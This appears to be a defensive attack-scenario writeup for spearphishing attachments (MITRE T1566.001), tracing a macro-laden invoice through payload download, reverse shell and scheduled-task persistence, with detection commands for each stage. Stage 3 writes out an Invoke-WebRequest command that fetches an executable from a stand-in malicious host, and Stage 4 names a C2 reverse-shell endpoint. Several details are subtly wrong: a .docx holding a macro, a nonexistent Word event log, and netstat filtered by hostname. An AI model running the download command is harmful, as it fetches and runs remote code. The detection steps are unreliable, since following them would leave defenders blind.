Pattern Name: T1566.001 - Spearphishing Attachment

Scenario Overview: This attack scenario illustrates how an attacker uses a spearphishing email with a malicious attachment to gain initial access to a victim's system. The attack progresses through multiple stages, involving email clients, web browsers, and office applications, ultimately leading to the execution of a payload that establishes persistence and allows for further exploitation.

Attack Flow Breakdown:

**Stage 1: Initial Access via Spearphishing Email**
- **Application Involved**: Outlook
- **User Action**: The victim receives a spearphishing email that appears to be from a trusted source, containing a malicious attachment (e.g., a Word document).
- **Key Artifacts**: 
  - Email Subject: "Important Update"
  - Attachment: `Invoice.docx`
- **Detection Indicators**:
  - Monitor for emails with suspicious attachments or from unknown senders.
  - Analyze email headers for anomalies.

```shell
# Example command to extract email headers for analysis
grep -i "Important Update" /var/log/mail.log
```

**Stage 2: Opening the Malicious Attachment**
- **Application Involved**: Microsoft Word
- **User Action**: The victim opens the attachment, triggering a macro that downloads a malicious payload.
- **Key Artifacts**: 
  - Document Path: `C:\Users\Victim\Downloads\Invoice.docx`
  - Macro Execution: `AutoOpen()`
- **Detection Indicators**:
  - Monitor for the execution of macros in Word documents.
  - Analyze logs for document access patterns.

```shell
# Example command to check for macro execution in Word
Get-WinEvent -LogName "Microsoft-Windows-Word/Operational" | Where-Object { $_.Message -like "*AutoOpen*" }
```

**Stage 3: Payload Download and Execution**
- **Application Involved**: PowerShell
- **User Action**: The macro executes a PowerShell command to download a malicious executable from a remote server.
- **Key Artifacts**: 
  - PowerShell Command: `Invoke-WebRequest -Uri http://malicious-server.com/payload.exe -OutFile C:\Users\Victim\AppData\Local\Temp\payload.exe`
  - Download Path: `C:\Users\Victim\AppData\Local\Temp\payload.exe`
- **Detection Indicators**:
  - Monitor for PowerShell commands that download executables.
  - Analyze network traffic for connections to known malicious domains.

```shell
# Example command to monitor PowerShell downloads
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object { $_.Message -like "*Invoke-WebRequest*" }
```

**Stage 4: Execution of the Malicious Payload**
- **Application Involved**: Windows Explorer
- **User Action**: The victim's system executes the downloaded payload, which establishes a reverse shell connection to the attacker's command and control server.
- **Key Artifacts**: 
  - Executable Path: `C:\Users\Victim\AppData\Local\Temp\payload.exe`
  - C2 Connection: `POST http://attacker-server.com/shell`
- **Detection Indicators**:
  - Monitor for unusual outbound connections from the victim's machine.
  - Analyze process creation logs for the execution of the payload.

```shell
# Example command to check for outbound connections
netstat -an | findstr "attacker-server.com"
```

**Stage 5: Establishing Persistence**
- **Application Involved**: Task Scheduler
- **User Action**: The payload modifies the Task Scheduler to ensure it runs on system startup.
- **Key Artifacts**: 
  - Task Name: `MaliciousTask`
  - Command: `C:\Users\Victim\AppData\Local\Temp\payload.exe`
- **Detection Indicators**:
  - Monitor for new scheduled tasks created by non-administrative users.
  - Analyze Task Scheduler logs for unusual task configurations.

```shell
# Example command to list scheduled tasks
schtasks /query /fo LIST /v | findstr "MaliciousTask"
```
